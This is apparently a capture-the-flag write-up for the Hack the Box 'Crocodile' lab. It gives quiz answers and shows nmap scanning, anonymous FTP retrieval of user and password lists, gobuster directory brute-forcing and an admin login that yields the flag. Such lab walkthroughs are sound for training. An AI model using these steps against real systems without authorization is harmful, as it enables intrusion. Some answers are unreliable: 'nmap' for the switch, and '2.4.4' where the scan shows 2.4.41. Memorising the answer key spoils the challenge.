# Crocodile
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Crocodile
* Topic: [[PHP]] [[FTP]] [[gobuster]]
* Difficulty: Very easy
* Date: 13-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What nmap scanning switch employs the use of default scripts during a scan? 
 - **nmap**
2. What service version is found to be running on port 21? 
- **vsftpd 3.0.3**
3. What FTP code is returned to us for the "Anonymous FTP login allowed" message? 
- **230**
4. What command can we use to download the files we find on the FTP server? 
- **get**
5. What is one of the higher-privilege sounding usernames in the list we retrieved? 
- **admin**
6. What version of Apache HTTP Server is running on the target host? 
- **2.4.4**
7. What is the name of a handy web site analysis plug-in we can install in our browser? 
- **Wappalyzer**
8. What switch can we use with gobuster to specify we are looking for specific filetypes? 
- **-x**
9. What file have we found that can provide us a foothold on the target? 
- **login.php**

---
## Flag:
Nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.52.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 14:18 EDT
Nmap scan report for 10.129.52.16
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```

We can see that ftp is hosted on port 21, also it os open and we can see two files in plain sight. We will use `ftp` to connect `get` to download the files to our local machine

Type `exit` to gracefully close the connection afterwards.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.129.21.75
Connected to 10.129.21.75.
220 (vsFTPd 3.0.3)
Name (10.129.21.75:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||47650|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |******************************************|    33      228.55 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.44 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||47203|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |******************************************|    62      438.74 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.91 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/Downloads]
└─$ ll
total 8
-rw-r--r-- 1 kali kali 33 Jun  8  2021 allowed.userlist
-rw-r--r-- 1 kali kali 62 Apr 20  2021 allowed.userlist.passwd
```

We got the files, let's see what they contain using `cat`.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                     
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

```

Some users and their passwords, let's find a place to log in.

![](./attachments/Pasted%20image%2020220413002627.png)

There are no login options anywhere on the page.

We can use `gobuster` to enumerate (bruteforce) hidden directories.

Command:

`gobuster dir --url 10.129.124.147 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html`

`--url`: Specify the url (directory) we want to enumerate.

`dir`: Enumerate directories, not DNS ex.

`--wordlist`: Use this list (list of common directory names).

`-x`: Find files in .php and .html format.

```console
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url 10.129.124.147 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.124.147
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2022/04/12 18:30:03 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577] 
Progress: 312 / 262995 (0.12%)
```

`/login.php` seems useful.

![](./attachments/Pasted%20image%2020220413003253.png)

Now we can try the credentials we found.

User:pass `admin:rKXM59ESxesUFHAd`

![](./attachments/Pasted%20image%2020220413003420.png)

The flag.

**Flag:** `c7110277ac44d78b6a9fff2232434d16`

---
**Tags:** [[HackTheBox]]